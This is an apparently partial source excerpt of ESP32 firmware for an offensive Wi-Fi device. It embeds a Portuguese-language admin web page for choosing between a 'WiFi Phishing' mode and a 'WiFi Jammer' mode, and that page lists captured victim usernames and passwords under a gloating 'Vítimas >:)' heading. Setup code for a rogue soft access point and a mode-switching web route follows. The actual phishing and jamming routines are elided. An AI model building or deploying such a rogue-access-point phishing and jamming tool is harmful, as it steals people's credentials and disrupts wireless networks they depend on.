...
//const char *amd_html PROGMEM =R"rawliteral()rawliteral";
const char *adm_html PROGMEM =R"rawliteral(<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Admin</title></head><body> <main style="min-height: 100vh; display: flex; flex-direction: column; justify-content: space-evenly"> <form action="GET" style="display: flex; flex-direction: column; width: 100%; justify-content: center; align-items: center"> <h2 style="margin-bottom: 30px;">Escolha o modo!</h2> <div style="display: flex; flex-direction: row ; min-width: 300px; width: 50%; justify-content: space-evenly; align-items: center"> <label style="display: flex; justify-content: center; align-items: center; flex-direction: column" for="modo"> <p>WiFi Phishing</p><input type="radio" name="MODO" value="phishing" id="phishing"> </label> <label style="display: flex; justify-content: center; align-items: center; flex-direction: column" for="MODO"> <p>WiFi Jammer</p><input type="radio" name="MODO" value="jammer" id="jammer"> </label> </div><label style="text-align: center; margin: 20px" for="ssid"> <p>SSID</p><input name="SSID" type="text"> </label> <button id="confirm">Confirmar</button> </form> <section style="display: flex; flex-direction: column; width: 100%; justify-content: center; align-items: center"> <h2 style="margin-bottom: 30px;">Vítimas >:)</h2> <table style="width: 50%; text-align:center; border: 1px solid black"> <thead> <th>Username</th> <th>Password</th> </thead> <tbody> <td>Teste</td><td>Teste</td></tbody> </table> </section> </main></body><style>*{margin: 0; padding: 0; font-family: "Roboto", sans-serif; box-sizing: border-box;}:root{--principal: #202124; --p: #797d80; --blue: #2c7fea; --border-card: #dadce0;}input{padding: 13px 15px; width: 100%; height: 55px; border-radius: 4px; border: 1px solid var(--border-card); outline-color: #1973e8; font-size: 16px;}button{background: transparent; border: none; cursor: pointer; color: var(--blue); font-weight: bold; font-size: 14px; outline: none;}button{background: var(--blue); color: white; padding: 9px 24px; font-size: 14px; outline: none; border: none; border-radius: 4px; cursor: pointer; transition: 0.2s;}</style><script>const victmsURL=''; const submitModeURL=''; let victms=[]; onLoadPage(); function onLoadPage(){fetch(victmsURL) .then(response=>response.json()) .then(response=>{victms=response;})}function onSubmitMode(e){e.preventDefault(); const form=document.querySelector('form'); form.submit();}let submitButton=document.getElementById('confirm'); submitButton.addEventListener('click',onSubmitMode);</script></html>)rawliteral";
...
String actual = "phishing";
String a_ssid = "esp32";

void setup_jamming(String ssid){
 ...
 if (!WiFi.softAP(ssid)) { 
  ...
  server.on("/GET", HTTP_GET, [] (AsyncWebServerRequest *request) {
    ...
    if(request->hasParam(SSID)){
      ...
      if(actual == "jammer" && modo == "phishing"){
